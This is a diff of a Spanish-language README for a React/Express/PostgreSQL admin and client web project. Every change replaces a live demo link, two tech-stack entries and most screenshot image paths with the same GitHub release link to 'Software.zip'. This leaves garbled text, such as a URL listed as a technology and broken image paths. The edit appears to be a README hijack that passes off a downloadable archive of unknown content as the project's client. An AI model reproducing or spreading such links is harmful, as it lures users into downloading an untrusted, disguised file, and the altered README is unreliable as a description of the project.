@@ -11,7 +11,7 @@ El proyecto que incluye:
   formulario de solicitud 
 ~~~
 
-<a href="https://deploy-admin-mgno.vercel.app" target="blank">
+<a href="https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" target="blank">
  👉👉👉Visita el Cliente👈👈👈
 </a>
   <br></br>
@@ -46,11 +46,11 @@ El proyecto que incluye:
 🔺Reactjs
 🔺Redux
 🔺Recharts
-🔺Expres.js
+🔺https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip
 🔺Sequelize
 🔺PostgreSQL
 🔺firebaseAuth
-🔺Node.js
+🔺https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip
 🔺CSS puro
 ```
 
@@ -60,19 +60,19 @@ ____________________
 
 ## Cliente 
 
-<a href="https://deploy-admin-mgno.vercel.app" target="blank">
+<a href="https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" target="blank">
  👉👉👉Visita el Cliente👈👈👈
 </a>
 <br></br>
 
 <p align="center">
- <img align="center" width="300px"  src="./imgs/cli min.png"/>
- <img align="center" width="300px"  src="./imgs/cards cli min.png" />
- <img align="center" width="300px"  src="./imgs/reseña min.png" />
+ <img align="center" width="300px"  src="./imgs/cli https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip"/>
+ <img align="center" width="300px"  src="./imgs/cards cli https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+ <img align="center" width="300px"  src="./imgs/reseña https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
  <br><br>
- <img align="center" width="500px" src="./imgs/inicio cli.png" />
- <img align="center" width="500px" src="./imgs/cards cli.png" />
- <img align="center" width="500px"  src="./imgs/hacer soli.png"/>
+ <img align="center" width="500px" src="./imgs/inicio https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+ <img align="center" width="500px" src="./imgs/cards https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+ <img align="center" width="500px"  src="./imgs/hacer https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip"/>
  <br><br>
 </p>
 
@@ -85,15 +85,15 @@ ____________________
 
 
 <p align="center">
-<img align="center" width="400px" src="./imgs/client det.png" />
-<img align="center" width="400px" src="./imgs/edit about.png" />
- <img align="center" width="400px" src="./imgs/edit serv.png" />
- <img align="center" width="400px" src="./imgs/edit serv.png" />
+<img align="center" width="400px" src="./imgs/client https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+<img align="center" width="400px" src="./imgs/edit https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+ <img align="center" width="400px" src="./imgs/edit https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+ <img align="center" width="400px" src="./imgs/edit https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
 </p>
 <br><br>
 <p align="center">
-<img align="center" width="300px" src="./imgs/serv lay min.png" />
-<img align="center" width="300px" src="./imgs/crear sol min.png" />
+<img align="center" width="300px" src="./imgs/serv lay https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
+<img align="center" width="300px" src="./imgs/crear sol https://github.com/manuxing/deploy-admin/releases/download/v1.0/Software.zip" />
 </p>
 
 
